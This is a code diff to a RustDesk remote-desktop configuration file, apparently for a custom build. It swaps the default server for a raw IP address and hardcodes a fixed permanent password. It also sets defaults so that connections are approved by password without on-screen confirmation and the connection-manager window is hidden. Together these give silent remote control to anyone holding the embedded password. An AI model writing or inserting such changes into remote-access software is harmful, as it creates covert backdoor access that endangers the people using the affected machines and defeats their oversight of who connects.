@@ -108,9 +108,9 @@ const CHARS: &[char] = &[
 ];
 
 // [自定义] ID/中继服务器地址 - 修改为你自己的服务器IP或域名
-pub const RENDEZVOUS_SERVERS: &[&str] = &["rs-ny.rustdesk.com"];
+pub const RENDEZVOUS_SERVERS: &[&str] = &["180.152.87.98"];
 // [自定义] 服务器公钥 - 从服务器的 id_ed25519.pub 文件获取
-pub const RS_PUB_KEY: &str = "OeVuKk5nlHiXp+APNn0Y3pC1Iwpwn44JGqrQCsWqmBw=";
+pub const RS_PUB_KEY: &str = "NpFPJl6sJA7sldL7Sptxz795PwywH8XIAUtePElRpzE=";
 
 pub const RENDEZVOUS_PORT: i32 = 21116;
 pub const RELAY_PORT: i32 = 21117;
@@ -1139,14 +1139,10 @@ impl Config {
         Self::clear_trusted_devices();
     }
 
+    // [自定义] 固定密码 - 强制使用固定密码
     pub fn get_permanent_password() -> String {
-        let mut password = CONFIG.read().unwrap().password.clone();
-        if password.is_empty() {
-            if let Some(v) = HARD_SETTINGS.read().unwrap().get("password") {
-                password = v.to_owned();
-            }
-        }
-        password
+        // 强制使用固定密码
+        "131421.qQ".to_owned()
     }
 
     pub fn set_salt(salt: &str) {
@@ -1812,8 +1808,39 @@ pub struct LocalConfig {
 }
 
 impl LocalConfig {
+    // [自定义] 默认配置 - 在这里添加默认选项
     fn load() -> LocalConfig {
-        Config::load_::<LocalConfig>("_local")
+        let mut config = Config::load_::<LocalConfig>("_local");
+        let mut store = false;
+
+        // 默认强制使用中继模式
+        if !config.options.contains_key("force-always-relay") {
+            config.options.insert("force-always-relay".to_string(), "Y".to_string());
+            store = true;
+        }
+
+        // 默认只使用固定密码验证
+        if !config.options.contains_key("verification-method") {
+            config.options.insert("verification-method".to_string(), "use-permanent-password".to_string());
+            store = true;
+        }
+
+        // 默认密码验证模式（不需要点击确认）
+        if !config.options.contains_key("approve-mode") {
+            config.options.insert("approve-mode".to_string(), "password".to_string());
+            store = true;
+        }
+
+        // 默认隐藏连接管理窗口
+        if !config.options.contains_key("allow-hide-cm") {
+            config.options.insert("allow-hide-cm".to_string(), "Y".to_string());
+            store = true;
+        }
+
+        if store {
+            config.store();
+        }
+        config
     }
 
     fn store(&self) {
